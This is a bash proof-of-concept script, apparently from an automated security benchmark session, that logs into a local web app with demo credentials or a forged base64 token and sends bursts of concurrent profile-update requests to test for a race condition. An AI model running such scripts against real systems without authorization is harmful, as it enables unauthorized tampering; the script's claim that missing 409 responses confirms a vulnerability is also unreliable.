#!/bin/bash
# POC: Demonstrates race condition vulnerability in profile update endpoint by sending multiple concurrent requests that modify the same profile simultaneously without conflict detection
# Target: ./repo
# Created: 2025-11-10T14:55:07.526Z
# Session: benchmark-XBEN-021-24-mht8yjkr

# Race Condition POC for /edit_profile/{company_id} endpoint
# This script demonstrates that concurrent updates to the same profile
# don't have proper locking or conflict detection mechanisms

TARGET_HOST="${1:-localhost:8080}"
COMPANY_ID="${2:-1}"
BASE_URL="http://${TARGET_HOST}"

# First, authenticate to get a valid token
echo "[*] Step 1: Obtaining authentication token..."
LOGIN_RESPONSE=$(curl -s -c cookies.txt -X POST "${BASE_URL}/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo")

if echo "$LOGIN_RESPONSE" | grep -q "error"; then
  echo "[-] Login failed: $LOGIN_RESPONSE"
  exit 1
fi

USER_TOKEN=$(curl -s -b cookies.txt "${BASE_URL}/" | grep -oP 'Bearer \K[A-Za-z0-9+/=]+' || echo "")
if [ -z "$USER_TOKEN" ]; then
  # Try to extract from the login response or use demo token
  USER_TOKEN="MQ=="  # base64("1") - demo account token
fi

echo "[+] Authentication successful. Token: $USER_TOKEN"
echo ""

# Verify current profile state
echo "[*] Step 2: Checking current profile state..."
INITIAL_STATE=$(curl -s -b cookies.txt -H "Cookie: user_token=Bearer $USER_TOKEN" \
  "${BASE_URL}/company/${COMPANY_ID}" 2>/dev/null)
echo "[+] Current profile: $INITIAL_STATE"
echo ""

# Now send multiple concurrent POST requests with different data to the same profile
echo "[*] Step 3: Sending concurrent update requests to create race condition..."
echo "[*] Sending 5 concurrent requests with different name values..."

# Function to send update request
send_update() {
  local request_num=$1
  local name=$2
  local response=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Cookie: user_token=Bearer $USER_TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "${BASE_URL}/edit_profile/${COMPANY_ID}" \
    -d "name=${name}&is_admin=0")
  
  local http_code=$(echo "$response" | tail -n 1)
  local body=$(echo "$response" | head -n -1)
  
  echo "[Request $request_num] Sent update with name='$name' - HTTP $http_code"
  echo "$body"
}

# Send concurrent requests
for i in {1..5}; do
  send_update $i "Company_Update_${i}" &
done

# Wait for all background jobs to complete
wait

echo ""
echo "[*] Step 4: Checking final profile state..."
FINAL_STATE=$(curl -s -b cookies.txt -H "Cookie: user_token=Bearer $USER_TOKEN" \
  "${BASE_URL}/company/${COMPANY_ID}" 2>/dev/null)
echo "[+] Final profile: $FINAL_STATE"
echo ""

# Analyze results
echo "[*] Step 5: Race Condition Analysis:"
echo "[-] If all 5 requests returned 200 OK without conflict detection → VULNERABLE"
echo "[-] If there's no version/timestamp checking or optimistic locking → VULNERABLE"
echo "[-] If final state shows only one update applied (no merge/conflict handling) → INDICATES RACE CONDITION"
echo ""

# Try to detect race condition evidence
echo "[*] Step 6: Attempting to demonstrate conflict by rapid sequential updates..."

# Send rapid updates to the same field to detect any conflict detection
for i in {1..10}; do
  curl -s -X POST \
    -H "Cookie: user_token=Bearer $USER_TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "${BASE_URL}/edit_profile/${COMPANY_ID}" \
    -d "name=RaceTest_${i}&is_admin=0" > /dev/null &
done

wait

echo "[+] Sent 10 rapid concurrent updates"
echo ""

# Check if any 409 Conflict responses were seen (would indicate conflict detection)
echo "[*] Step 7: Testing for conflict detection with version awareness..."

# Send multiple requests and check for any conflict responses
CONFLICT_FOUND=0
for i in {1..3}; do
  RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Cookie: user_token=Bearer $USER_TOKEN" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    "${BASE_URL}/edit_profile/${COMPANY_ID}" \
    -d "name=Test_${i}&is_admin=0")
  
  HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
  
  if [ "$HTTP_CODE" == "409" ]; then
    CONFLICT_FOUND=1
    echo "[+] Conflict detected (409) - Endpoint has conflict detection!"
  fi
done

if [ "$CONFLICT_FOUND" == "0" ]; then
  echo "[-] NO CONFLICT DETECTION FOUND (409 responses)"
  echo "[-] All concurrent requests accepted without conflict handling → RACE CONDITION VULNERABILITY CONFIRMED"
fi

echo ""
echo "[*] POC Complete"